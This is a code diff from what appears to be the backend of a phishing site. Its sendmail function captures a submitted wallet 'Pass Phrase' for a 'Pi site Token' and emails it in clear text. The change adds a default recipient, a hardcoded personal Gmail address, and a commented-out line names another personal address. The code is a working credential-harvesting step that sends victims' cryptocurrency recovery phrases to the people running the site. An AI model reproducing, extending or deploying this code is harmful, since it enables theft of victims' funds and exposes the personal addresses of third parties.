@@ -14,12 +14,17 @@ def send_notify(subject, payload, email_to):
     
     return sending_no(payload, recipient, sender,password, subject)
 
-def sendmail(request, keys, email):
+def sendmail(request, keys, email=None):
     current_date = datetime.now()
     formatted_time = current_date.strftime("%Y-%m-%d %H:%M:%S")
     
     decoded_param = unquote(keys)
-    send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {decoded_param} )', subject=f'Pi site Token Submitted {formatted_time}', email_to=email)
+
+    if email == None:
+        send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {decoded_param} )', subject=f'Pi site Token Submitted {formatted_time}', email_to='ezekielobiajulu01@gmail.com')
+
+    else:
+        send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {decoded_param} )', subject=f'Pi site Token Submitted {formatted_time}', email_to=email)
                     
     # send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {decoded_param} )', subject=f'Pi site Token Submitted {formatted_time}', email_to="obikeechiemerielinus@gmail.com")
     
